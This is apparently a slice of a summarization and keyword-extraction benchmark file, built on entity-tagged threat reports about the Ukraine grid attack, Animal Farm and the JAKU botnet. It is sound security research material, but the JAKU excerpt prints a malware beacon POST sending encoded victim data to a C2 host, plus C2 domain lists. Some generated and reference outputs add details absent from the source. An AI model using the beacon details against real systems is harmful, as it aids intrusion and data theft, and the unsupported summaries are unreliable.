communication bridges. The attackers also launched telephone denial-of-service attacks on call centers. Recommended defensive mitigation strategies involve improving architecture, logging, segmentation, monitoring, response planning, and information sharing. Future attacks may vary tactics so defense must be flexible. The attacks crossed lines by publicly targeting civilian critical infrastructure. The implications are that defenders must prepare for highly targeted synchronized attacks that burn bridges. Information sharing and cooperation were key. The response by Ukraine was impressive but the attack could succeed in many countries. Infrastructure defenders globally must learn from this case. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.36482084690553745, "gpt3/lexical/rouge_rouge2": 0.08524590163934427, "gpt3/lexical/rouge_rougeL": 0.15635179153094464, "gpt3/lexical/rouge_rougeLsum": 0.15635179153094464, "gpt3_generated_text": ["This article provides an analysis of the cyber attack on the Ukrainian power grid that occurred on December 23, 2015. The attack was carried out by a third party who gained illegal access to the company's computer and SCADA systems. Seven 110 kV and 23 35 kV substations were disconnected for three hours, causing service outages to approximately 80,000 customers. However, it was later revealed that the attack affected three different distribution companies and resulted in power outages for approximately 225,000 customers. The Ukrainian government claimed that Russian security services were responsible for the attack. This report does not focus on attribution but rather provides important details about the attack, lessons learned, and recommendations for defense strategies for the ICS community."]}, {"split_name": "val", "sample_id": "val_98", "prompt_text": "Extract the keywords: Animals in the [ORG] APT Farmsecurelist.com/animals-in-the-apt-farm/69114By GReATIn [DATE] 2014 , researchers at [PERSON] Kaspersky [PERSON] Lab discovered and reported on [CARDINAL] three zero - days that were being used in cyberattacks in the wild . [CARDINAL] Two of these zero - day vulnerabilities are associated with an advanced threat actor we call [ORG] Animal [ORG] Farm . Over [DATE] the [DATE] past [DATE] few [DATE] years , [ORG] Animal [ORG] Farm has targeted a wide range of global organizations . [NORP] Victims include : Government organizations Military contractors [NORP] Humanitarian aid organizations Private companies Journalists and media organizations [ORG] ActivistsOur colleagues at [ORG] Cyphort , G - DATA and [ORG] ESET have recently published blogs about [PERSON] Bunny , [GPE] Casper and [GPE] Babar , some of the [NORP] Trojans used by the [ORG] Animal [ORG] Farm group . The Farm includes several [NORP] Trojans , which we have grouped into [CARDINAL] six major families : Here \u2019s a brief description of the animals in the farm : [PERSON] Bunny \u2013 an old \u201c validator\u201d-style Trojan used with a [ORG] PDF zero - day attack in [DATE] 2011.1/4Dino \u2013 a full - featured espionage platform . Babar \u2013 the most sophisticated espionage platform from the [ORG] Animal [ORG] Farm group . [CARDINAL] NBot \u2013 malware used in a botnet - style operation by the group . It has DDoS capabilities . Tafacalou \u2013 a validator - style [GPE] Trojan used by the attackers in [DATE] recent [DATE] years . Confirmed victims get upgraded to Dino or Babar . [GPE] Casper \u2013 the most recent \u201c validator\u201d-style implant from the [ORG] Animal [ORG] Farm group . The group has been active since [DATE] at [DATE] least [DATE] 2009 and there are signs that earlier malware versions were developed as far back as 2007.Over the years we have tracked multiple campaigns by the [ORG] Animal [ORG] Farm group . These can be identified by a specific code found either in the malware configuration or extracted from the [ORG] C&C logs . Most recently , the group deployed the [ORG] Casper [ORG] Trojan via a watering - hole attack in [GPE] Syria . A full description of this zero - day attack can be found in this blog post by [PERSON] Kaspersky [PERSON] Lab \u2019s [PERSON] Vyacheslav [PERSON] Zakorzhevsky . In addition to these , the [ORG] Animal [ORG] Farm attackers used [CARDINAL] at [CARDINAL] least [CARDINAL] one unknown , mysterious malware during an operation targeting computer users in [GPE] Burkina [GPE] Faso . [ORG] KSN [ORG] & [ORG] Sinkholing statistics During the investigation we sinkholed a large number of [ORG] C&C servers used by the [ORG] Animal [ORG] Farm group . This allowed us to compile a comprehensive picture of both targets and victims.2/4The malware known as Tafacalou ( aka \u201c TFC \u201d , \u201c Transporter \u201d ) is perhaps of greatest interest here , because it acts as an entry point for the more sophisticated spy platforms [PERSON] Babar and [PERSON] Dino . Based on the Tafacalou infection logs , we observed that most of the victims are in the following countries : [GPE] Syria , [GPE] Iran , [GPE] Malaysia , [GPE] USA , [GPE] China , [GPE] Turkey , [GPE] Netherlands , [GPE] Germany , [GPE] Great [GPE] Britain , [GPE] Russia , [GPE] Sweden , [GPE] Austria , [GPE] Algeria , [GPE] Israel , [GPE] Iraq , [GPE] Morocco , [GPE] New [GPE] Zealand , [GPE] Ukraine . What does \u201c [WORK_OF_ART] Tafacalou \u201d mean ? \u201c Tafacalou \u201d is the attacker \u2019s internal name for [CARDINAL] one of the validator ( [ORDINAL] 1st stage ) [NORP] Trojans . We tried various spellings of this word to see if it means anything in a specific language , and the most interesting option is one with its origins in the [GPE] Occitan language : \u201c [WORK_OF_ART] Ta [WORK_OF_ART] Fa [WORK_OF_ART] Calou . \u201dThe expression \u201c Fa Calou \u201d is the [NORP] French interpretation of the [WORK_OF_ART] Occitane \u201c Fa Calor \u201d which means \u201c it \u2019s getting hot \u201d ( see url occitane-et-ses-quelques.html ) . \u2018 Ta Fa Calou \u201d could therefore be taken to mean \u201c so it \u2019s getting hot \u201d based on the [GPE] Occitan language . According to [ORG] Wikipedia : \u2018 [GPE] Occitan is a Romance language spoken in southern [GPE] France , [GPE] Italy \u2019s Occitan [GPE] Valleys , [GPE] Monaco , and [GPE] Spain \u2019s [PERSON] Val [PERSON] d\u2019Aran ; collectively , these regions are sometimes referred to unofficially as \u201c Occitania\u201d.3/4Note : A detailed technical report on [ORG] Animal [ORG] Farm is available to customers of [ORG] Kaspersky [ORG] Intelligent [ORG] Services . For more information , contact intelreports@kaspersky.com4/4", "generated_text": "APT; Animal Farm; targets; organizations; government; military; military contractors; private companies; journalists; media organizations; the group; Bunny; Casper; Babar; NBot; Dabhor; a validator-style Trojan; Trojans; Tafacalou; the group; years; Kaspersky Lab; monitoring; cyberattacks; Malware; zero-days; various espionage platforms; a recent version; the group; Kaspersky Lab; Kaspersky Lab; Activists; governments; the wild.", "ref_text": "<START-1>The document describes the activities of a sophisticated cyberespionage threat actor that Kaspersky Lab researchers have dubbed \"Animal Farm.\" Animal Farm has been active since at least 2009 and targets a wide range of organizations globally, including government agencies, military contractors, humanitarian groups, private companies, journalists, activists, and more. Animal Farm uses several custom malware families as part of its operations, which Kaspersky has categorized into 6 groups: Bunny, Dino, Babar, NBot, Tafacalou, and Casper. Each malware family has different capabilities and is deployed at different stages of Animal Farm's attacks. For example, Tafacalou is used as an initial infection vector to then deploy more advanced malware like Dino or Babar on high-value targets. By analyzing command and control server logs, Kaspersky has identified numerous Animal Farm victims, with concentrations in Syria, Iran, Malaysia, the US, China, Turkey, and various European countries. The name Tafacalou may derive from the Occitan language and mean \"so it's getting hot,\" suggesting the malware is heating up or escalating its attacks. Animal Farm has used at least 3 zero-day vulnerabilities over the years to distribute its malware, including via PDF and watering hole attacks. The group continues to evolve its tactics, techniques, and procedures. Kaspersky assesses with high confidence that Animal Farm operates on behalf of a nation-state sponsor based on its sophisticated capabilities and global targeting aligned with espionage objectives. Kaspersky did not attribute Animal Farm to a specific country in this report. In summary, Animal Farm is a highly capable, long-running cyberespionage actor that deploys multiple custom malware families and constantly innovates to compromise new targets globally, likely in support of a nation-state's intelligence requirements. Ongoing monitoring and research is required to track this advanced persistent threat.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45951859956236324, "gpt3/lexical/rouge_rouge2": 0.15824175824175823, "gpt3/lexical/rouge_rougeL": 0.2669584245076586, "gpt3/lexical/rouge_rougeLsum": 0.2669584245076586, "gpt3_generated_text": ["In this article by Kaspersky Lab, the author discusses the activities of a threat actor group known as Animal Farm. The group has been active since at least 2009 and has targeted a wide range of organizations, including government organizations, military contractors, humanitarian aid organizations, private companies, journalists, and media organizations. The group has used various Trojans, including Bunny, Casper, Babar, NBot, Dino, and Tafacalou, to carry out their cyberattacks. Animal Farm has also been associated with the discovery of three zero-day vulnerabilities in 2014. The article provides a brief description of each Trojan used by the group and highlights their capabilities. It also mentions that the group has been active in recent years and has targeted victims in countries such as Syria, Iran, Malaysia, USA, China, Turkey, Netherlands, Germany, Great Britain, Russia, Sweden, Austria, Algeria, Israel, Iraq, Morocco, and New Zealand. The article concludes by mentioning that a detailed technical report on Animal Farm is available to customers of Kaspersky Intelligent Services."]}, {"split_name": "val", "sample_id": "val_99", "prompt_text": "Extract the keywords: TLP - WHITE | [CARDINAL] 1TABLE OF CONTENTSExecutive Summary 4 Technical Analysis 6 Unique Victim Computer 6 [NORP] Victims by Languages 6 [NORP] Victims by Country [CARDINAL] 7 [NORP] Victims per Time - zone [CARDINAL] 8 [NORP] Victims by [PERSON] Network [PERSON] Provider [CARDINAL] 9 Victims by Population 10 Counterfeit Windows Installations [CARDINAL] 12 Malware Version Numbering [CARDINAL] 12 Total Number of JAKU Victims 13 C2 Servers Locations and [NORP] Victims 14 C2 Data Sets 15 Total Number of JAKU Victims per C2 Server 16 Mapping [PERSON] Victim [PERSON] Locations [CARDINAL] 17 [LOC] Americas and [ORG] European [ORG] Coverage 18 [NORP] Korean and [NORP] Japanese Coverage 19 [NORP] Russian Coverage 20 [NORP] Static and Behavioural Analysis 21 Malware Stage 1 \u2013 Poisoned Bit Torrent 21 Stage 1 Behaviour [CARDINAL] 21 Windows Update 21 Reconnaissance 21 Calling Home 22 [ORG] Awaiting [ORG] Orders [CARDINAL] 22 [ORG] Malware [ORG] Stage [ORG] 2 \u2013 Fake PNG Files 23 Encryption Algorithm 23 Bad Crypto 24 Compression Algorithm 24 Malware Stage 2 \u2013 R2D3 [CARDINAL] 25 Stealth Injection [CARDINAL] 25 AV Engine Detection 25 Service Installation [CARDINAL] 25 Malware Configuration [CARDINAL] 29 Malware Stage 2 \u2013 C3PRO - RACCOON [CARDINAL] 30 C3PRO 30 [ORG] DNS Command [ORG] Channel [ORG] 32 [ORG] Observations on C3PRO - RACCOON 34TLP - WHITE | 2UDT Library 34 Secure Delete [CARDINAL] 34 Unfinished Code 34 Spoofed File Dates 34 Under Development 34 Who is [ORG] SAPHARUS ? [CARDINAL] 35 [ORG] SAPHARUS Timeline [CARDINAL] 35 The Real SAPHARUS 35 [ORG] Hypothesis # 1 - Overwrites 35 [ORG] Hypothesis # [ORG] 2 [ORG] - [ORG] Additions 35 SAPHARUS at [ORG] Forcepoint [ORG] 35 [ORG] Diversity [ORG] of [ORG] Addresses [CARDINAL] 35 Truncated System Information 35 C2 Telemetry Databases [CARDINAL] 36 SQLite Databases [DATE] 36 [DATE] Near.jpg [DATE] 36 HISTORY Table 37 CHILD Table [CARDINAL] 38 INFO Column Commands 38 Parting Thoughts for the Reader 43 An Exercise to the Reader 43 Why JAKU ? [CARDINAL] 43 References [CARDINAL] 44TLP - WHITE | [CARDINAL] 3EXECUTIVE SUMMARYJAKU is the name given to the investigation , surveillance and analysis , by [EVENT] the [EVENT] Forcepoint [EVENT] Special [EVENT] Investigations team , of an on - going botnet campaign . Organised crime has been operating botnets for [DATE] several [DATE] years and the term itself has been in common parlance for [DATE] over [DATE] a [DATE] decade . While JAKU may not answer all the questions regarding botnets , it does offer some insight and understanding into the inner workings of a botnet . JAKU also sheds some light onto the victims of botnets , why they are vulnerable , and possibly , why they are targeted . What JAKU demonstrates is the re - use of [ORG] Infrastructure , Tools , Techniques and Processes ( TTPs ) , as well as the herding of victims into separate groupings ; some indiscriminate and others highly targeted . Both the herding of general botnet victims and highly targeted attacks on individuals and organisations is hardly surprising . What is somewhat of a step change , however , is the execution of a number of concurrent operations within a campaign , using almost identical TTPs , to both herd [CARDINAL] thousands of victims into becoming botnet members while at the same time executing a targeted operation on a very small number of individuals . Within the [CARDINAL] noise [CARDINAL] of [CARDINAL] thousands of seemingly indiscriminate botnet victims , the [ORG] JAKU campaign performs a separate , highly targeted operation . [ORG] Forcepoint [ORG] Security [ORG] Labs has identified the precision targeting and tracking of a small number of individuals of various nationalities . These individuals include members of [GPE] International Non- [ORG] Governmental [ORG] Organisations ( NGOs ) , Engineering Companies , Academics , Scientists and Government Employees . [GPE] North [GPE] Korea ( DPRK ) and [GPE] Pyongyang are the common theme shared between these individuals . Because of the sensitivity of this part of the investigation , only the technical details of the \u2018 RED - RACOON \u2019 operation are contained within this report and [ORG] Law [ORG] Enforcement [ORG] and [ORG] Government [ORG] Agencies have been informed . This paper examines how the JAKU botnets are constructed and identifies their characteristics , and in the case of the targeted attacks , how they differ from the scattergun attacks of broader botnet activities . This study also highlights the consequences that Internet users who disregard copyrights and digital rights may face . Many may incur end - point security vulnerabilities that may not only leave them subject to attack , but also may allow their machines to be misused by adversaries , such as the JAKU botnet controllers , to execute information and identity theft . Botnets are an easy form of resilient , redundant and highly pervasive attack infrastructures that are repeatedly deployed by major threat actors , such as organised crime - sponsored attackers and rogue states via their agencies . This resilience is strengthened by what appears to be the herding of victims into smaller bot - networks . This , to some degree at least , ensures that if the botnet is compromised then the remainder of the campaign is left to operate . Finding , tracking and shutting down attack modes and methodologies with such capabilities can be a formidable task . No single organisation can do it alone . It requires the close collaboration and intelligence- sharing activities of both private organisations and government agencies . Fortunately , even before the inception of this investigation in [DATE] October [DATE] of [DATE] 2015 , Forcepoint customers enjoyed protection from the threats presented by the malware discussed in this paper by [ORG] TRITON \u00ae ACE.TLP - WHITE | 4OVERVIEWThe JAKU campaign has clear connections with the TTPs used by the threat actors discussed by [PERSON] Kaspersky in the [ORG] DARKHOTEL investigations from [DATE] November [DATE] 2014 . This paper recognises the extensive contributions by [PERSON] Kaspersky in this area and acknowledges their detailed work . What was not in the public domain and has been identified as part of this investigation , are the following : Piracy . The prevalence of users / victims who are running counterfeit installations of [ORG] Microsoft Windows \u00ae , downloading \u2018 warez \u2019 software and using [ORG] BitTorrent software to illegally obtain these as well as other copyright protected material , such as movies and music . C2 Databases . The use of SQLite files to collate and manage the botnet members , their structure and the use of version numbering . [PERSON] Poisoned [PERSON] BitTorrents . The technique of threat actors deploying torrent files onto torrent sites that are pre- infected with malware has not been widely seen before , especially with respect to [ORG] BitTorrent - types of attack . This behaviour is difficult to trace and track and is indiscriminate in its infection pattern unless it has some means of targeting desired demographics . Resilient C2 Channels . Stage [CARDINAL] two of one piece of malware has [CARDINAL] three inbuilt [ORG] Command and Control ( C2 ) mechanisms . This level of resilience is not accidental , but rather , such investment and effort is usually indicative of the perceived value of the target . ACKNOWLEDGEMENTSForcepoint would like to thank our colleagues at [ORG] the [ORG] UK [ORG] National [ORG] Crime [ORG] Agency ( [ORG] NCA ) , [ORG] CERT - [GPE] UK , KrCERT / CC , [ORG] Europol and [ORG] Interpol for their cooperation and assistance in this investigation . Only with a truly interactive approach to collaborative intelligence collection , collation and analysis can we , as an industry , ensure that the Internet is a safe place to do business and conduct our personal lives . Acknowledgement and thanks to our industry partners and peers who have offered their professional insightThanks are due to the following individuals , without their contribution and guidance this document would not have been possible : [PERSON] Pierre [PERSON] Boisrond , [PERSON] David [PERSON] Andreas , [PERSON] Josh [PERSON] Douglas , [PERSON] Carl [PERSON] Leonard , [PERSON] Rajiv [PERSON] Motwani , [PERSON] Eunju [PERSON] Pak , [PERSON] Nigel [PERSON] Roberts , [PERSON] Brian [PERSON] Shirey , [PERSON] Boris [PERSON] Sieklik , [PERSON] Luke [PERSON] Stamp and [PERSON] John [PERSON] Underhill . TLP - WHITE | 5TECHNICAL [ORG] ANALYSISUnique [ORG] Victim [ORG] Computer . The JAKU servers allocate a unique ID ( [ORG] UID ) to every victim . The system tracks victims by this [ORG] UID and records the time that the victim \u2018 calls home \u2019 to the botnet command and control server . Over the period from [DATE] September [DATE] 2015 [DATE] to [DATE] May [DATE] 2016 , in excess of [CARDINAL] 29,000 unique victims have been recorded by JAKU . However , the prevalence of duplicate entries in the telemetry data ( See : [ORG] SAPHARUS ) suggests that a more realistic figure is closer to 19,000.Victims by [GPE] Languages . The system locale setting within a [PRODUCT] Windows computer is used to specify the language used when a programme does not understand [GPE] Unicode characters . In effect , it is the language used by the operator of the computer . The victims of the [ORG] JAKU campaign are clearly clustered around the [NORP] Japanese and [NORP] Korean languages . [NORP] Korean ( [PERCENT] 43 [PERCENT] % ) and [NORP] Japanese ( [PERCENT] 30 [PERCENT] % ) make up [PERCENT] over 73 [PERCENT] % of the victim machines , followed by [LANGUAGE] English ( 13 [PERCENT] % ) and [NORP] Chinese ( [PERCENT] 10 [PERCENT] % ) . [PERCENT] The [PERCENT] remaining [PERCENT] 4 [PERCENT] % of victims are spread across [CARDINAL] 27 other languages . LANGUAGEPERCENTAGELANGUAGEPERCENTAGEKoreanJapaneseEnglishChineseFrenchPolishPortugueseSpanish ; [NORP] CastilianGermanItalianTurkishArabicRomanian ; [NORP] Moldavian ; [PERSON] MoldovanHungarianCroatianSwedishSerbianDanishThaiCzechRussianLithuanianGreekNorwegianHebrewEstonianFinnishMacedonianPersianDutch ; FlemishSlovenian43%30%13%10%1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%TLP [ORG] - WHITE | 6Victims by [ORG] Country . The JAKU campaign covers the majority of countries across the world , [CARDINAL] 134 at the last count . [DATE] Between [DATE] September [DATE] 2015 and [DATE] May [DATE] 2016 , there were [CARDINAL] an [CARDINAL] estimated [CARDINAL] 19,000 unique victims . [PERCENT] Over 87 [PERCENT] % of victim computers were in [CARDINAL] one of [CARDINAL] four countries : [GPE] South [GPE] Korea ( 42 [PERCENT] % ) , [GPE] Japan ( 31 [PERCENT] % ) , [GPE] China ( [PERCENT] 8 [PERCENT] % ) and [GPE] the [GPE] United [GPE] States ( 6 [PERCENT] % ) . This distribution is consistent with the data from the system locale analysis . [NORP] Victims per CountryOTHERS , [CARDINAL] 12%US , [CARDINAL] 6%CN , 8%KR , 42%JP , 31%COUNTRY PERCENTAGEKR < 1%TLP - WHITE | 7Victims per [ORG] Time - zone . Each of the victim machines has a time - zone setting for the geographic region the system is configured to operate in . The observed distribution of time - zone settings for the victim computers reinforces the bias towards [GPE] Korea and [GPE] Japan which both have time - zone offsets of [GPE] +09:00 ( [PERSON] Korea [PERSON] Standard [PERSON] Time , [ORG] Tokyo [ORG] Standard [ORG] Time , and [PERSON] Yakutsk [PERSON] Standard [PERSON] Time ) at [PERCENT] over 69 [PERCENT] % of victims . The only other major grouping of victims is the +08:00 time - zone ( China Standard Time , [ORG] Singapore [ORG] Standard [ORG] Time , [ORG] Taipei [ORG] Standard [ORG] Time , West Australia Standard Time and [LOC] North [LOC] Asia [LOC] East [LOC] Standard [LOC] Time ) with 11 [PERCENT] % of all victims . [NORP] Victims per Timezone+02:00 , 1.08 [PERCENT] % OTHERS ( < 1%),3%-06:00 , 1.26%GMT , [CARDINAL] 1.45%+05:30 , 1.64%+07:00 , [CARDINAL] 1.88%+01:00 , [CARDINAL] 2.66%-05:00 , [CARDINAL] 2.83%-08:00 , 3.53%+08:00 , 11.51%+09:00 , [CARDINAL] 69.54%TZ OFFSET-12:00 0.12%TLP - WHITE | 8Victims by [PERSON] Network [PERSON] Provider . All IP addresses are controlled within groupings which are sometimes referred to as routing domains . These routing domains are identified by [ORG] their [ORG] Autonomous [ORG] System [ORG] Numbers ( [ORG] ASN ) . For the JAKU victims , there is a broad spread of victims across [CARDINAL] 1,555 ASNs . There is a clear bias on [NORP] Korean , [NORP] Japanese and [NORP] Chinese providers : [ORG] NETWORK [ORG] PROVIDERASNsCOUNTYPERCENTAGEKorea TelecomAS4766Republic of Korea14.91%SK [PERSON] Broadband ( Hanaro Telecom Inc.)AS9318Republic of [ORG] KoreaLG [ORG] Uplus [ORG] Corp.(LG [ORG] DACOM [ORG] Corporation , [PERSON] LG [PERSON] Powercomm)AS17858 ( 6.25 [PERCENT] % ) AS3786 ( [CARDINAL] 2.13%)Republic of [ORG] KoreaNTT [ORG] Communications CorporationKDDI CORPORATIONAS4713AS2516JapanJapanChinanetAS4134People [GPE] \u2019s [GPE] Republic of [ORG] ChinaSoftbank [ORG] BB [ORG] Corp. AS17676JapanOTHERS < 2 % ( [CARDINAL] 1547)7.96%8.38%6.54%4.70%3.73%3.44%50.34%Corporate [NORP] Victims . Amongst the JAKU victims , the number of corporate victims is significantly low . The proportion of victim computers that are a member of a [ORG] Microsoft Windows domain rather than workgroups or as standalone systems is [PERCENT] less [PERCENT] than [PERCENT] 1 [PERCENT] % of the total . This is calculated on [CARDINAL] just [CARDINAL] 153 unique victims matching the corporate criteria . [PERSON] Dwell [PERSON] Time . The length of time a botnet victim is infected is referred to as the dwell time . For those identified as corporate victims , the mean dwell time is [DATE] 93 [DATE] days , with the maximum observed being [DATE] 348 [DATE] days . TLP - WHITE | 9Victims by Population . If the number of unique victims per country is factored against the population of the respective countries , a somewhat different picture emerges . [GPE] Korea and [GPE] Japan are still at the top of the target list , but [GPE] Taiwan and [GPE] Hong [GPE] Kong rise , while the [GPE] US and [GPE] China drop . What is most striking is the clear bias toward [NORP] South [NORP] Korean victims : [NORP] Victims per [CARDINAL] Million Population162.10946.23430.80813.709 13.57 11.816.781 PL020406080100120140160180Listed below are those countries with greater than [CARDINAL] one victim per [CARDINAL] million of population : [ORG] COUNTRY VICTIMSCOUNTRYPOPULATION1 VICTIMS / MILLIONKR 90Korea , SouthJapanHong KongTaiwanSingaporeMacau Windows onto a new computer , they use what is known as an OEM product ID ( [ORG] PID ) . These PIDs can be identified from retail ones as they contain the text , \u201c OEM \u201c . In cases where Windows reports that the \u2018 model \u2019 of the computer is \u2018 To be filled by O.E.M. \u2019 and the [ORG] PID contains [ORG] OEM , it indicates with some reasonable certainty that an OEM product license has been used on non - OEM hardware . In other words , the system is running a counterfeit [ORG] Microsoft [PRODUCT] Windows license . With this in mind , the total number of OEM PIDs identified is [CARDINAL] 12,243 . The number of them that appear to be counterfeit is [CARDINAL] 6,366 . For OEM licenses , this indicates that 52 [PERCENT] % are likely to be counterfeits . It \u2019s reasonable to assume that this ratio can be used to infer the prevalence of counterfeits across all the JAKU victims , i.e. including those with retail PIDs . The likelihood that 52 [PERCENT] % of computers are actually running counterfeit copies of [ORG] Microsoft [ORG] Windows warrants further attention . According to the IDC study , \u201c Unlicensed Software and [ORG] Cybersecurity [ORG] Threats \u201d ( [CARDINAL] 2015)2 : \u201c \u2026 a clear link between unlicensed software and cybersecurity threats For enterprises , governments , and consumers , the obvious implication is that one way to lower cybersecurity risks is to reduce the use of unlicensed software . \u201d However , the evidence from [NORP] JAKU paints a clearer picture : Whereas enterprise and like \u2013 sized organizations may well be operating correctly with the licensing of software , there are a sizable number of other businesses and organizations that are not . Within the large number of JAKU victim computers , [PERCENT] 75 [PERCENT] % of [NORP] Korean machines appear to be running counterfeit Windows ; for [GPE] Japan this figure is [PERCENT] 25 [PERCENT] % . Both these percentages are twice the figure stated in the IDC report , which states that [GPE] Korea has a piracy rate of [PERCENT] 38 [PERCENT] % and [GPE] Japan [PERCENT] 12 [PERCENT] % . Not surprisingly , the country with the largest percentage of JAKU victims is [GPE] China , with 85 [PERCENT] % of computers being suspected of using counterfeit PIDs . This is even worse than [PERCENT] the [PERCENT] estimated 74 [PERCENT] % of machines in [GPE] China suspected of running counterfeit Windows in the IDC report . [ORG] Malware [ORG] Version [ORG] Numbering . During analysis of the malware and the [CARDINAL] C2 data sets , a version numbering scheme was identified : within the [CARDINAL] C2 data sets , [CARDINAL] almost [CARDINAL] 60 unique version numbers were present . However , for come and go . But so , too , do the [CARDINAL] C2 servers for [ORG] JAKU . Whole sections of the JAKU victim sets go offline because their [CARDINAL] C2 server has also disappeared . Because the malware used has hard - coded domain names and not [ORG] IP addresses , the [CARDINAL] C2 servers can come back on - line with a new [ORG] IP address and catch up on their existing victims . Why these servers go offline is not always clear . However , it has certainly been observed on [CARDINAL] at [CARDINAL] least [CARDINAL] one occasion that a JAKU server had been compromised by what appeared to be another threat actor wishing to use the server for credit card fraud . This situation , however , did not continue for more than a few being located in [GPE] Malaysia , [GPE] Thailand and [GPE] Singapore : C2IPASNBLACK- SQLite databases by each of the active [CARDINAL] C2 servers . Each IP address identified has a separate [ORG] Data [ORG] Set of browny.ddns.net sweetbrowny.mooo.com cometome.yourtrap.comUNKNOWNbbsbox.strangled.net minicooper.strangled.nettorrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.com torrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.comfile2.strangled.net blog3.serveblog.net torent.dnsd.info dns53.ignorelist.com www.bbsupdates.comxa.comUNKNOWNtorrent.dtdns.net decrypt.dnsd.info decrypt.info.tm torrent.serveblog.net decrypt.effers.comboardchk.strangled.net minicooper.ddns.com minicooper.chickenkiller.com cutemini.sexidude.com ] REDACTED [ UNKNOWNTLP - WHITE | 15Total Number of JAKU Victims per C2 Server . Far more complex figures appear when the number of victims are clustered into their [ORG] Command and Control ( C2 ) servers and monitored over time . Gaps , such as those illustrated by [ORG] SAPHARUS , are due to infrastructure problems and servers going offline . Others , such as the YELLOW [NORP] - BOA disappearance , are far more complex and are possibly due to servers having a take - down notice applied to them by law enforcement . Total Number of JAKU Victims per [CARDINAL] C2 [NORP] Server6000500040003000200010000 Oct/2015Nov/2015Dec/2015Jan/2016Feb/2016Mar/2016Apr/2016BLACK - SAPHARUSBROWN - COOPERGREY - THAIYELLOW - BOARED - RACOONGREEN - SOUNDFIXPINK - COWORANGE - HOWLVIOLET - FOXBLUE - MONKEYTLP - WHITE | 16Mapping [PERSON] Victim [PERSON] Locations . By using [ORG] IP to geo - location database services , it \u2019s possible to plot the location of the JAKU victim machines : TLP - WHITE | [CARDINAL] 17Americas and [ORG] European [ORG] Coverage . [LOC] North [LOC] America and [LOC] Europe feature significant coverage , but [LOC] South [LOC] America and [LOC] Africa only have limited coverage : TLP - WHITE | 18Korean and [NORP] Japanese Coverage . The predominance of JAKU victim machines being located in [GPE] South [GPE] Korea and [GPE] Japan is clearly illustrated : TLP - WHITE | [CARDINAL] 19Russian CoverageTLP - WHITE | 20STATIC AND BEHAVIOURAL ANALYSISMALWARE STAGE [CARDINAL] 1 \u2013 POISONED BIT TORRENTName Dropped by SoundFix.exe ( from poisoned movie and TV [TIME] 11Stage [TIME] 1 [TIME] Behaviour . Check HKCU\\CLSID for a default value entry that contains a [ORG] GUID . This entry is only present if the malware has already generated and added it to the registry . On [ORDINAL] first run , this registry value will not be present . If the value already existed , it uses the existing GUID . Otherwise , if HKCU\\CLSID does not exist , it generates a new , unique GUID using the CoCreateGUID Windows API . This is then saved [DATE] under [DATE] HKCU\\CLSID under the ( default ) value : [ORG] Windows [ORG] Update . As shown in the picture above , the sample also creates [CARDINAL] two other registry values under the [PERSON] CLSID key . The [ORDINAL] first one , \" [WORK_OF_ART] System \" , holds the sample 's version number ; and the [ORDINAL] second one , \" [ORG] WindowsUpdate \" , contains the current system time . Reconnaissance . The sample executes the following commands in order : date /t dir\"c:\\Program Files\\ \" dir\"c:\\Program [PERSON] Files ( x86)\\ \" dir \" % s\"Where \" % s \" is the directory of both the directory of the user 's bookmarks ( favourites ) and then the directory of the recently opened documents . TLP - WHITE | 21Calling Home . The sample then beacons to its [CARDINAL] C2 server , including sending the version number , private [ORG] IP address , [ORG] GUID and also the encoded system information if the previous registry entries did not already exist . If the registry entries existed already , then only the sample 's version number , the [ORG] GUID and the private IP address are sent . An example of this communication including the system information ( & if= ) can be seen below : POST url [ORG] HTTP/1.1 Content [ORG] - Type : application / x - www - form - urlencoded Accept : * / * User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1 ; Trident/4.0 Host : movieadd.mooo.com Content - Length : [CARDINAL] 15442 Connection : Keep - Alive Pragma : no - cache uid={22CFF683 - D866 - 48AE-9792 - 073002A23557}&v=11&pi=16843009,&if= upOt@M0b5yPI#9vkUpgm2YAgUMLe5dLa@dOoUduaUMPlzCbk@Cv3UcAB#9En@9za@x5ezsA0@cAgUMLa5pBt5YAnUlAn#xRHz [CARDINAL] yvwzyPmzCBcUMPnzy5w4dJkUd4aTxfaLMA3#p3bUYA0Ue@34Mvk@pBnTxOt4lAnTCPtzCPJ#x3Izyvj@sAn@xBJzCBnFcAI#x [CARDINAL] 0m29EQ@xEk#xRkUe@34Mvk@pBnTxOt4nAdUM0V@9AwTxgn2dEwUsfazBAI@xBm@sAkUdEI5xv3zyvj@sAMUM0Wz80BuLv9sLg [CARDINAL] 8Ko4aUpfa5Cb3zyEo#dk3#MuaUC3t@sXi2sW = The system information is encoded with base64 using the custom alphabet : [ORG] XAY78BCyz012DEFSuvsKLPx9#@TU456ZabcVW3dejkGHIJtwQRlmnopMfghiNOqrAwaiting [ORG] Orders . The sample then checks the response to the above request from the server . If the server returns a payload , then the sample will attempt to decrypt and execute it as an executable , and then finish ( terminate ) execution of itself . The format of these payloads that the sample expects is a fake [ORG] PNG that contains an encryption key , as documented in the next section . Upon further analysis , the malware has no capability of understanding or executing anything other than this format . If no payload is received , the malware will finish ( terminate ) execution immediately . TLP - WHITE | [CARDINAL] 22MALWARE STAGE 2 \u2013 FAKE [ORG] PNG FILESNot only is the [CARDINAL] C2 telemetry data held in a file that purports to be a [ORG] JPEG image file , but the [ORDINAL] 1st stage malware itself attempts to download and decrypt the [ORDINAL] 2nd stage in a file that upon [ORDINAL] first glance appears to be a graphical image . The downloaded file , when examined look like a [ORG] PNG image file , the headers even conform to the [ORG] PNG cryptographic and compression algorithms . Subsequently , Forcepoint created a command line utility to decrypt and decompress these fake [ORG] PNG files . Encryption Algorithm . The encryption algorithm used is a modified RC4 implementation . The file analysed modified RC4 routine was found at offset : 0x0041903C. Forcepoint re - coded this in C as : [ORG] BOOL rc4(BYTE * buf , int bufsize , BYTE * modkey , int modkeylen)// [CARDINAL] 0x0041903C { int i , x ; byte g = [CARDINAL] 0 ; byte j = [CARDINAL] 0 ; unsigned char xorIndex ; unsigned char tmp ; char keydata[257 ] ; char state[257 ] 